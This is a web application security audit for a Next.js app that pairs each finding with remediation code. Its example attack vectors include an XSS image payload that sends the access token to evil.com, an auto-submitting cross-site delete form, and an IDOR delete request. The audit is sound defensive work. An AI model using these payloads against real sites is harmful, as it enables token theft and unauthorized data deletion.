---
title: "Security Audit"
date: "2025-11-25 00:00 (KST)"
type: "assessment"
category: "security"
status: "completed"
version: "1.0"
tags: ["security", "audit", "vulnerabilities", "nextjs"]
---

# Security Audit

**Audit Date:** 2025-11-25
**Severity Levels:** 🔴 Critical | 🟡 High | 🟢 Medium | 🔵 Low

---

## Executive Summary

The application has **multiple critical security vulnerabilities** that must be addressed immediately. Issues include client-side authentication, exposed tokens in localStorage, missing CSRF protection, no input validation, XSS vulnerabilities, and insecure API practices.

**Critical Issues Found:** 7  
**High Severity Issues:** 5  
**Risk Level:** CRITICAL

---

## Findings

### 🔴 CRITICAL: Client-Side Only Authentication

**Severity:** Critical  
**CVSS Score:** 9.1 (Critical)  
**Location:** `/store/authStore.ts`, all protected routes

**Issue:**
Authentication is entirely client-side with no server validation:
1. JWT tokens stored in localStorage (vulnerable to XSS)
2. No httpOnly cookies
3. Authentication checks happen client-side only
4. Protected routes can be bypassed

**Current Code:**
```typescript
// authStore.ts - INSECURE
export const useAuthStore = create<AuthState>((set) => ({
  login: async (email, password) => {
    const { access_token, refresh_token } = response.data;
    
    // ❌ VULNERABLE: Storing JWT in localStorage
    localStorage.setItem('access_token', access_token);
    localStorage.setItem('refresh_token', refresh_token);
  }
}));

// layout.tsx - INSECURE
useEffect(() => {
  if (isInitialized && !isAuthenticated) {
    router.push('/login'); // ❌ Can be bypassed with browser dev tools
  }
}, [isAuthenticated]);
```

**Attack Vector:**
```javascript
// Attacker can bypass authentication:
localStorage.setItem('access_token', 'fake_token');
// Now they can access protected routes
```

**Impact:**
- Complete authentication bypass
- Unauthorized access to protected routes
- Session hijacking via XSS
- No way to invalidate compromised tokens

**Recommendation:**

**Immediate Fix - Use httpOnly Cookies:**

```typescript
// actions/auth.ts
'use server'

import { cookies } from 'next/headers'
import { redirect } from 'next/navigation'

export async function login(formData: FormData) {
  const email = formData.get('email')
  const password = formData.get('password')
  
  const response = await fetch(`${API_URL}/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  })
  
  if (!response.ok) {
    return { error: 'Invalid credentials' }
  }
  
  const { access_token, refresh_token } = await response.json()
  
  // ✅ SECURE: Store in httpOnly cookies
  const cookieStore = await cookies()
  cookieStore.set('access_token', access_token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 60 * 60 * 24 * 7, // 7 days
    path: '/',
  })
  
  cookieStore.set('refresh_token', refresh_token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 60 * 60 * 24 * 30, // 30 days
    path: '/',
  })
  
  redirect('/dashboard')
}

// middleware.ts - Server-side auth check
export async function middleware(request: NextRequest) {
  const token = request.cookies.get('access_token')
  
  if (!token) {
    return NextResponse.redirect(new URL('/login', request.url))
  }
  
  // Validate token with backend
  const valid = await verifyToken(token.value)
  if (!valid) {
    return NextResponse.redirect(new URL('/login', request.url))
  }
  
  return NextResponse.next()
}

export const config = {
  matcher: '/dashboard/:path*'
}
```

**Login Form:**
```typescript
'use client'

import { login } from '@/actions/auth'
import { useFormState } from 'react-dom'

export default function LoginPage() {
  const [state, formAction] = useFormState(login, null)
  
  return (
    <form action={formAction}>
      <input name="email" type="email" required />
      <input name="password" type="password" required />
      {state?.error && <p>{state.error}</p>}
      <button type="submit">Login</button>
    </form>
  )
}
```

---

### 🔴 CRITICAL: XSS Vulnerabilities

**Severity:** Critical  
**CVSS Score:** 8.8 (High)  
**Location:** TiptapEditor, blog content rendering

**Issue:**
User-generated HTML content rendered without sanitization:

```typescript
// TiptapEditor.tsx
onUpdate: ({ editor }) => {
  onChange(editor.getHTML()); // ❌ Unsanitized HTML
}

// Later rendered as:
<div dangerouslySetInnerHTML={{ __html: content }} /> // ❌ XSS RISK
```

**Attack Vector:**
```javascript
// Attacker inputs:
<img src=x onerror="alert('XSS');fetch('https://evil.com/steal?data='+localStorage.getItem('access_token'))">
```

**Impact:**
- Token theft
- Session hijacking
- Malicious script execution
- Data exfiltration

**Recommendation:**

Install and use DOMPurify:
```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

```typescript
// lib/sanitize.ts
import DOMPurify from 'dompurify'

export function sanitizeHTML(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      'p', 'br', 'strong', 'em', 'u', 's', 'code', 'pre',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'ul', 'ol', 'li', 'blockquote', 'a'
    ],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOW_DATA_ATTR: false,
  })
}

// TiptapEditor.tsx
import { sanitizeHTML } from '@/lib/sanitize'

onUpdate: ({ editor }) => {
  const html = editor.getHTML()
  onChange(sanitizeHTML(html)) // ✅ Sanitized
}

// Rendering
<div dangerouslySetInnerHTML={{ __html: sanitizeHTML(content) }} />
```

**Better Alternative - Use TipTap's JSON format:**
```typescript
// Store as JSON instead of HTML
onUpdate: ({ editor }) => {
  onChange(JSON.stringify(editor.getJSON()))
}

// Render using TipTap (already safe)
<EditorContent editor={editor} content={JSON.parse(content)} />
```

---

### 🔴 CRITICAL: No CSRF Protection

**Severity:** Critical  
**CVSS Score:** 8.1 (High)  
**Location:** All form submissions, API calls

**Issue:**
No CSRF tokens for state-changing operations.

**Attack Vector:**
```html
<!-- Attacker's website -->
<form action="https://yourapp.com/api/documents/delete" method="POST">
  <input type="hidden" name="id" value="victim-document-id">
</form>
<script>document.forms[0].submit();</script>
```

**Recommendation:**

Use Server Actions (built-in CSRF protection):
```typescript
// actions/documents.ts
'use server'

import { cookies } from 'next/headers'

export async function deleteDocument(documentId: string) {
  // Next.js automatically validates CSRF tokens for Server Actions
  const token = (await cookies()).get('access_token')?.value
  
  const response = await fetch(`${API_URL}/documents/${documentId}`, {
    method: 'DELETE',
    headers: { Authorization: `Bearer ${token}` },
  })
  
  if (!response.ok) throw new Error('Failed to delete')
  
  revalidatePath('/dashboard/documents')
}
```

For API routes (if needed):
```typescript
// middleware.ts
import { createCsrfMiddleware } from '@edge-csrf/nextjs'

const csrfMiddleware = createCsrfMiddleware({
  cookie: {
    secure: process.env.NODE_ENV === 'production',
  },
})

export async function middleware(request: NextRequest) {
  const response = await csrfMiddleware(request)
  return response
}
```

---

### 🔴 CRITICAL: No Input Validation

**Severity:** Critical  
**CVSS Score:** 7.5 (High)  
**Location:** All form inputs

**Issue:**
No client-side or server-side validation of user inputs.

**Current:**
```typescript
const [email, setEmail] = useState('');
// No validation, sent directly to API
await login(email, password);
```

**Recommendation:**

Use Zod for validation:
```bash
npm install zod
```

```typescript
// lib/validations.ts
import { z } from 'zod'

export const loginSchema = z.object({
  email: z.string().email('Invalid email address').min(1, 'Email required'),
  password: z.string().min(8, 'Password must be at least 8 characters'),
})

export const documentUploadSchema = z.object({
  file: z.instanceof(File)
    .refine(file => file.size <= 50 * 1024 * 1024, 'File must be less than 50MB')
    .refine(
      file => ['application/pdf', 'audio/mpeg', 'image/jpeg', 'image/png'].includes(file.type),
      'Invalid file type'
    ),
})

// actions/auth.ts
'use server'

export async function login(formData: FormData) {
  const data = {
    email: formData.get('email'),
    password: formData.get('password'),
  }
  
  // ✅ Validate input
  const validated = loginSchema.safeParse(data)
  if (!validated.success) {
    return { errors: validated.error.flatten().fieldErrors }
  }
  
  // Proceed with validated data
  const response = await fetch(`${API_URL}/auth/login`, {
    method: 'POST',
    body: JSON.stringify(validated.data),
  })
  
  // ...
}
```

Client-side form:
```typescript
'use client'

import { useFormState } from 'react-dom'
import { login } from '@/actions/auth'

export default function LoginForm() {
  const [state, formAction] = useFormState(login, null)
  
  return (
    <form action={formAction}>
      <input name="email" type="email" />
      {state?.errors?.email && <p className="error">{state.errors.email}</p>}
      
      <input name="password" type="password" />
      {state?.errors?.password && <p className="error">{state.errors.password}</p>}
      
      <button type="submit">Login</button>
    </form>
  )
}
```

---

### 🔴 CRITICAL: Insecure Direct Object References (IDOR)

**Severity:** Critical  
**CVSS Score:** 8.2 (High)  
**Location:** Document/draft deletion, all resource access

**Issue:**
No authorization checks on resource access:

```typescript
// Any user can delete any document by changing the ID
const handleDelete = async (docId: string) => {
  await documentsAPI.delete(docId); // ❌ No ownership check
}
```

**Attack Vector:**
```javascript
// Attacker can access/delete other users' documents
fetch('/api/documents/any-user-doc-id', { method: 'DELETE' })
```

**Recommendation:**

Backend MUST validate ownership:
```python
# backend/api/documents.py
@router.delete("/documents/{document_id}")
async def delete_document(
    document_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    document = db.query(Document).filter(
        Document.id == document_id,
        Document.user_id == current_user.id  # ✅ Ownership check
    ).first()
    
    if not document:
        raise HTTPException(status_code=404, detail="Document not found")
    
    db.delete(document)
    db.commit()
    return {"message": "Deleted"}
```

Frontend should handle 403/404 gracefully:
```typescript
'use server'

export async function deleteDocument(documentId: string) {
  const response = await fetch(`${API_URL}/documents/${documentId}`, {
    method: 'DELETE',
  })
  
  if (response.status === 404 || response.status === 403) {
    throw new Error('Document not found or access denied')
  }
  
  revalidateTag('documents')
}
```

---

### 🟡 HIGH: Exposed Tokens in EventSource URLs

**Severity:** High  
**CVSS Score:** 7.4 (High)  
**Location:** `/editor/[draftId]/page.tsx`

**Issue:**
Token passed in URL query parameters:

```typescript
// ❌ INSECURE: Token in URL (logged in server logs, browser history)
const eventSource = new EventSource(
  `${API_URL}/api/v1/blog/${draftId}/refine?token=${token}`
);
```

**Impact:**
- Tokens logged in server access logs
- Tokens in browser history
- Tokens in referrer headers
- Token leakage through proxy logs

**Recommendation:**

Use POST requests with Server Actions or headers:
```typescript
// Better: Use Server Actions for streaming
'use server'

export async function* refineContent(draftId: string, feedback: string) {
  const token = (await cookies()).get('access_token')?.value
  
  const response = await fetch(`${API_URL}/blog/${draftId}/refine`, {
    method: 'POST',
    headers: { 
      'Authorization': `Bearer ${token}`, // ✅ Token in header
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ feedback }),
  })
  
  const reader = response.body?.getReader()
  const decoder = new TextDecoder()
  
  while (true) {
    const { done, value } = await reader!.read()
    if (done) break
    
    const chunk = decoder.decode(value)
    yield chunk
  }
}

// Client component
'use client'

import { refineContent } from '@/actions/blog'

async function handleRefine() {
  for await (const chunk of refineContent(draftId, feedback)) {
    setContent(prev => prev + chunk)
  }
}
```

---

### 🟡 HIGH: No Rate Limiting

**Severity:** High  
**CVSS Score:** 6.5 (Medium)  
**Location:** All API endpoints

**Issue:**
No rate limiting on client-side requests. Vulnerable to:
- Brute force attacks
- DDoS
- Resource exhaustion

**Recommendation:**

Implement rate limiting middleware:
```typescript
// middleware.ts
import { Ratelimit } from '@upstash/ratelimit'
import { Redis } from '@upstash/redis'

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, '10 s'), // 10 requests per 10 seconds
})

export async function middleware(request: NextRequest) {
  const ip = request.ip ?? '127.0.0.1'
  const { success, limit, reset, remaining } = await ratelimit.limit(ip)
  
  if (!success) {
    return new NextResponse('Too Many Requests', {
      status: 429,
      headers: {
        'X-RateLimit-Limit': limit.toString(),
        'X-RateLimit-Remaining': remaining.toString(),
        'X-RateLimit-Reset': reset.toString(),
      },
    })
  }
  
  return NextResponse.next()
}
```

---

### 🟡 HIGH: Insecure Environment Variable Exposure

**Severity:** High  
**CVSS Score:** 6.8 (Medium)  
**Location:** `next.config.js`

**Issue:**
API URLs exposed in client bundle:

```javascript
env: {
  NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL || 'http://localhost:8002',
  NEXT_PUBLIC_WS_URL: process.env.NEXT_PUBLIC_WS_URL || 'ws://localhost:8002',
}
```

**Impact:**
- Internal URLs exposed in production
- Attackers can map internal infrastructure

**Recommendation:**

1. Remove hardcoded defaults:
```javascript
// next.config.js
env: {
  NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Required in .env
}
```

2. Use Server Components/Actions for sensitive operations:
```typescript
// Don't expose backend URLs to client
// Make requests from server components instead
```

3. Use API route rewrites:
```javascript
// next.config.js
async rewrites() {
  return [
    {
      source: '/api/:path*',
      destination: `${process.env.BACKEND_URL}/api/:path*`, // Server-side only
    },
  ]
}
```

---

### 🟡 HIGH: No Content Security Policy (CSP)

**Severity:** High  
**CVSS Score:** 6.1 (Medium)  
**Location:** Response headers

**Issue:**
No CSP headers to prevent XSS, clickjacking, etc.

**Recommendation:**

```typescript
// middleware.ts
export function middleware(request: NextRequest) {
  const response = NextResponse.next()
  
  // Content Security Policy
  response.headers.set(
    'Content-Security-Policy',
    [
      "default-src 'self'",
      "script-src 'self' 'unsafe-eval' 'unsafe-inline'", // Adjust based on needs
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "font-src 'self'",
      "connect-src 'self' https://api.yourbackend.com",
      "frame-ancestors 'none'",
    ].join('; ')
  )
  
  // Additional security headers
  response.headers.set('X-Frame-Options', 'DENY')
  response.headers.set('X-Content-Type-Options', 'nosniff')
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin')
  response.headers.set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()')
  
  return response
}
```

---

### 🟢 MEDIUM: Weak Password Requirements

**Severity:** Medium  
**Location:** Registration form

**Issue:**
No password strength requirements enforced.

**Recommendation:**

```typescript
import { z } from 'zod'

const passwordSchema = z.string()
  .min(12, 'Password must be at least 12 characters')
  .regex(/[a-z]/, 'Must contain lowercase letter')
  .regex(/[A-Z]/, 'Must contain uppercase letter')
  .regex(/[0-9]/, 'Must contain number')
  .regex(/[^a-zA-Z0-9]/, 'Must contain special character')

export const registerSchema = z.object({
  email: z.string().email(),
  password: passwordSchema,
  confirmPassword: z.string(),
}).refine(data => data.password === data.confirmPassword, {
  message: "Passwords don't match",
  path: ['confirmPassword'],
})
```

---

### 🟢 MEDIUM: Sensitive Data in Console Logs

**Severity:** Medium  
**Location:** Multiple files

**Issue:**
```typescript
console.error('Failed to fetch:', error); // May log sensitive data
```

**Recommendation:**

Use proper logging:
```typescript
// lib/logger.ts
export const logger = {
  error: (message: string, error?: unknown) => {
    if (process.env.NODE_ENV === 'production') {
      // Send to error tracking service (Sentry, etc.)
      console.error(message) // Don't log error object in production
    } else {
      console.error(message, error)
    }
  }
}
```

Remove console logs in production:
```javascript
// next.config.js
compiler: {
  removeConsole: process.env.NODE_ENV === 'production' ? {
    exclude: ['error', 'warn']
  } : false,
}
```

---

## Security Checklist

### Authentication & Authorization
- [ ] Migrate to httpOnly cookies
- [ ] Implement server-side auth middleware
- [ ] Add token refresh mechanism
- [ ] Implement proper session management
- [ ] Add MFA support (future)

### Data Protection
- [ ] Implement input sanitization
- [ ] Add DOMPurify for HTML sanitization
- [ ] Use Zod for input validation
- [ ] Encrypt sensitive data at rest
- [ ] Use HTTPS only in production

### API Security
- [ ] Add CSRF protection
- [ ] Implement rate limiting
- [ ] Add request signing
- [ ] Validate all inputs server-side
- [ ] Use authorization checks on all resources

### Headers & Policies
- [ ] Add CSP headers
- [ ] Implement security headers
- [ ] Configure CORS properly
- [ ] Add referrer policy
- [ ] Set up permissions policy

### Monitoring
- [ ] Set up security monitoring
- [ ] Implement audit logging
- [ ] Add intrusion detection
- [ ] Monitor for suspicious activity
- [ ] Set up alerts for security events

---

## Priority Implementation Plan

### Week 1: Critical Fixes
1. ✅ Migrate authentication to httpOnly cookies
2. ✅ Add server-side auth middleware
3. ✅ Implement input validation with Zod
4. ✅ Add HTML sanitization

### Week 2: High Priority
5. ✅ Fix EventSource token exposure
6. ✅ Add CSRF protection
7. ✅ Implement rate limiting
8. ✅ Add security headers

### Week 3: Medium Priority
9. ✅ Enhance password requirements
10. ✅ Add CSP policy
11. ✅ Remove sensitive console logs
12. ✅ Implement audit logging

---

## Testing Security

### Security Testing Tools
```bash
# Install security testing tools
npm install --save-dev @next/eslint-plugin-next
npm install --save-dev eslint-plugin-security

# Run security audit
npm audit
npm audit fix

# Check for known vulnerabilities
npx snyk test
```

### Penetration Testing Checklist
- [ ] Test authentication bypass
- [ ] Test for XSS vulnerabilities
- [ ] Test for CSRF vulnerabilities
- [ ] Test IDOR vulnerabilities
- [ ] Test rate limiting
- [ ] Test input validation
- [ ] Test file upload security

---

## Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Next.js Security Best Practices](https://nextjs.org/docs/app/building-your-application/security)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Content Security Policy Reference](https://content-security-policy.com/)
